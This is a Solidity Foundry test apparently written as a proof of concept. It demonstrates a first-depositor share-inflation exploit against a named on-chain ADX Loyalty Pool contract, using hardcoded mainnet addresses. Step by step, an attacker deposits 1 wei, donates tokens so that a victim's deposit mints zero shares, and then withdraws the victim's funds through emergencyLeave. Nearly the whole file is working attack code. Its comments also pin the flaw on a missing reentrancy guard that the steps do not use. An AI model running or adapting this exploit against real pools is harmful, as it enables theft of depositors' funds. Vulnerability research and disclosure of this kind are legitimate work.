// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IADXLoyaltyPool {
    function enter(uint256 amount) external;
    function leave(uint256 shares) external;
    function emergencyLeave(uint256 shares) external;
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function ADXToken() external view returns (address);
}

/// @notice PoC: ADX Loyalty Pool first-depositor share inflation
/// Same mint-before-transfer pattern as xSUSHI but with NO reentrancy guard.
/// ADX Loyalty Pool: 0xd9A4cB9dc9296e111c66dFACAb8Be034EE2E1c2C
/// ADX Token: 0xADE00C28244d5CE17D72E40330B1c318cD12B7c3
contract ADXDoubleMintTest is Test {
    address constant ADX = 0xADE00C28244d5CE17D72E40330B1c318cD12B7c3;
    address constant ADX_LOYALTY = 0xd9A4cB9dc9296e111c66dFACAb8Be034EE2E1c2C;

    IERC20 adx = IERC20(ADX);
    IADXLoyaltyPool pool = IADXLoyaltyPool(ADX_LOYALTY);

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    /// @notice Proves first-depositor inflation on ADX Loyalty Pool
    function test_adxFirstDepositorInflation() public {
        uint256 attackerADX = 100_000 ether; // 100k ADX for donation
        uint256 victimDeposit = 99_999 ether; // victim deposits 99,999 ADX

        // Give tokens
        deal(ADX, attacker, attackerADX + 1);
        deal(ADX, victim, victimDeposit);

        // Drain pool to simulate empty state
        deal(ADX, ADX_LOYALTY, 0);
        // Zero totalSupply — slot 1 (slot 0 = symbol string)
        vm.store(ADX_LOYALTY, bytes32(uint256(1)), bytes32(uint256(0)));

        assertEq(adx.balanceOf(ADX_LOYALTY), 0, "Pool should have 0 ADX");
        assertEq(pool.totalSupply(), 0, "Pool should have 0 shares");

        // Step 1: Attacker enters with 1 wei
        vm.startPrank(attacker);
        adx.approve(ADX_LOYALTY, type(uint256).max);
        pool.enter(1);

        assertEq(pool.balanceOf(attacker), 1, "Attacker: 1 share");
        assertEq(adx.balanceOf(ADX_LOYALTY), 1, "Pool: 1 wei ADX");

        // Step 2: Attacker donates ADX directly
        adx.transfer(ADX_LOYALTY, attackerADX);
        assertEq(adx.balanceOf(ADX_LOYALTY), attackerADX + 1);
        vm.stopPrank();

        // Step 3: Victim deposits
        vm.startPrank(victim);
        adx.approve(ADX_LOYALTY, type(uint256).max);
        pool.enter(victimDeposit);

        uint256 victimShares = pool.balanceOf(victim);
        emit log_named_uint("Victim deposited ADX", victimDeposit);
        emit log_named_uint("Victim received shares", victimShares);
        assertEq(victimShares, 0, "CRITICAL: Victim got 0 shares!");
        vm.stopPrank();

        // Step 4: Attacker withdraws all
        uint256 attackerBefore = adx.balanceOf(attacker);
        vm.prank(attacker);
        pool.emergencyLeave(1); // bypass mintIncentive which might revert

        uint256 attackerAfter = adx.balanceOf(attacker);
        uint256 profit = attackerAfter - attackerBefore;

        emit log_named_uint("Attacker withdrew ADX", profit);
        emit log_named_uint("Attacker NET PROFIT (ADX)", victimDeposit);

        // Attacker gets donation + victim's deposit
        assertEq(profit, attackerADX + 1 + victimDeposit);

        emit log("=== ADX LOYALTY POOL EXPLOIT PROVEN ===");
        emit log("No reentrancy guard + mint-before-transfer = double theft vector");
    }
}
